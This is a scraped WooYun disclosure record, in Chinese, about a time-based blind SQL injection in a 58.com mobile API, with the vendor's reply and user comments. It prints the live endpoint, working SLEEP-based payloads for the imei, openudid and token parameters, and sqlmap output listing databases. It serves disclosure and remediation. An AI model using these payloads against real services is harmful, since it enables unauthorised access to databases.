{"id": 73911, "wybug_id": "wooyun-2015-0164603", "wybug_title": "58 同城API存在SQL注射涉及主库654个表", "wybug_corp": "58同城", "wybug_author": "路人甲", "wybug_date": "2015-12-25 13:43", "wybug_open_date": "2016-02-08 18:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向公众公开  简要描述： 58 同城API存在sql注射 详细说明：  58 同城API存在sql注射，涉及主库654个表链接：http://app.58.com/api/log/api/msgpush/add/bj/1注入参数：Parameter: imei (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: imei=0f607264fc6318a92b9e13c65db7cd3c' AND (SELECT * FROM (SELECT(SLEEP(5)))jDPC) AND 'NvIX'='NvIX&openudid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&recendtime=23-59-59&recstarttime=00-00-00&sid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&syspush=0&token=23d6d8bcedee54e8c5f53d7bfc4ceade17afd26cbdd8967239cc3c0739367d84&userid=&version=6.3.3   漏洞证明：  ---Parameter: openudid (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: imei=0f607264fc6318a92b9e13c65db7cd3c&openudid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f' AND (SELECT * FROM (SELECT(SLEEP(5)))cvWY) AND 'Lvek'='Lvek&recendtime=23-59-59&recstarttime=00-00-00&sid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&syspush=0&token=23d6d8bcedee54e8c5f53d7bfc4ceade17afd26cbdd8967239cc3c0739367d84&userid=&version=6.3.3Parameter: token (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: imei=0f607264fc6318a92b9e13c65db7cd3c&openudid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&recendtime=23-59-59&recstarttime=00-00-00&sid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&syspush=0&token=23d6d8bcedee54e8c5f53d7bfc4ceade17afd26cbdd8967239cc3c0739367d84' AND (SELECT * FROM (SELECT(SLEEP(5)))lBOh) AND 'abXa'='abXa&userid=&version=6.3.3Parameter: imei (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: imei=0f607264fc6318a92b9e13c65db7cd3c' AND (SELECT * FROM (SELECT(SLEEP(5)))jDPC) AND 'NvIX'='NvIX&openudid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&recendtime=23-59-59&recstarttime=00-00-00&sid=c833e528c12ac1755a9e2f67e98a93b9e5cc919f&syspush=0&token=23d6d8bcedee54e8c5f53d7bfc4ceade17afd26cbdd8967239cc3c0739367d84&userid=&version=6.3.3---there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: token, type: Single quoted string (default)[1] place: POST, parameter: imei, type: Single quoted string[2] place: POST, parameter: openudid, type: Single quoted string[q] Quit> 1[13:19:47] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[13:19:47] [INFO] fetching database names[13:19:47] [INFO] fetching number of databases[13:19:47] [INFO] resumed: 3[13:19:47] [INFO] resumed: information_schema[13:19:47] [INFO] resumed: dbwww58com_wap[13:19:47] [INFO] resumed: testavailable databases [3]:[*] dbwww58com_wap[*] information_schema[*] test   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-26 10:48 厂商回复： 感谢对58安全的关注，我们小伙伴看到你这个标题中的\"主库\"二字，瞬间被吓尿了....不过我们核实过了，这个不是主库，也没有什么敏感信息，都是一些客户端版本号、时间之类的信息。最近小礼物没库存了，申请下来之后可能会给小伙伴们一起发送…… 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-25 16:25 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:377 漏洞数:70        | 我是一只毛毛虫。)\t\t \n  听说是标题党，哈哈~~~    \n     2015-12-25 16:37 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1656 漏洞数:246        | WooYun is the Bigest gay place.  网络工...)\t\t \n  一看就是标题党，那有那么多表，胡说。    \n     2015-12-25 20:31 |    \t\tBMa  \t\t\t( 普通白帽子  |\t\t\t        Rank:1903 漏洞数:212        )\t\t \n  看来楼上两位都是亲自上去看过    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}